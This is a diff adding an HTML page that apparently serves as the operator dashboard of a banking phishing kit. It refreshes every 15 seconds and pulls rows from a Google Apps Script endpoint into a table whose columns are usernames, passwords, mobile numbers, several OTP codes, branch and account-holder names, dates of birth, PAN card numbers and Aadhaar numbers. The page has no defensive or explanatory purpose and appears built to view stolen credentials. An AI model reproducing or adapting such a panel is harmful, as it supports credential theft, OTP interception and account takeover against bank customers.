@@ -1,0 +1,79 @@
+ 
+<!DOCTYPE html>
+<html lang="en">
+ 
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>data</title>
+    <style>
+        tr {
+            background-color: lightGrey;
+        }
+        
+        tr:nth-child(2n) {
+            background-color: grey;
+        }
+      
+      .rt{
+         padding: 10px;
+      }
+    </style>
+
+<script>
+   setTimeout (function() {
+      location.reload();
+   }, 15000);
+   
+ </script> 
+</head>
+ 
+<body style="background-position:bottom; bottom:20px; position:absolute; border-bottom:5px dotted green; width:98%;">
+    <table></table>
+<!-- <table class="rt">
+   <th>username</th>
+   <th>password</th>
+   <th>mobile no</th>
+   <th>otp1</th>
+   <th>branch name</th>
+   <th>holder name</th>
+   <th>dob</th>
+   <th>otp2</th>
+   <th>otp3</th>
+   <th>otp4</th>
+   <th>otp5</th>
+   <th>otp6</th>
+   <th>otp7</th>
+   <th>otp8</th>
+</table> -->
+<span style="padding-left: 54px;">Username</span>
+<span style="padding-left: 74px;">Password</span>
+<span style="padding-left: 102px;">Mobile No</span>
+<span style="padding-left: 19px;">OTP_1</span>
+<span style="padding-left: 14px;">Branch Name</span>
+<span style="padding-left: 10px;">Account Holder</span>
+<span style="padding-left: 52px;">DOB</span>
+<span style="padding-left: 111px;">OTP_2</span>
+<span style="padding-left: 13px;">Pancardno</span>
+<span style="padding-left: 4px;">panName</span>
+<span style="padding-left: 4px;">OTP_3</span>
+<span style="padding-left: 4px;">AadharNo</span>
+<span style="padding-left: 4px;">AadharName</span>
+<span style="padding-left: 4px;">OTP_4</span>
+<span style="padding-left: 4px;">OTP_5</span>
+    <script>
+        fetch('https://script.google.com/macros/s/AKfycbwMxeiy_Yle8A0FiU3q4dLRM9K4UCu-mQx-YxsX49aVe-HsxJaQxD0e7uZ-HgAw3xjILA/exec')
+            .then(res => res.json())
+            .then(data => {
+                let tr = data.content.reduce((prev, cur) => {
+                    let td = cur.map(e => `<td>${e}</td>`)
+                    return prev + `<tr>${td.join("")}</tr>`
+                }, "\r")
+                document.querySelector("table").innerHTML = tr;
+                
+            });
+    </script>
+</body>
+ 
+</html>
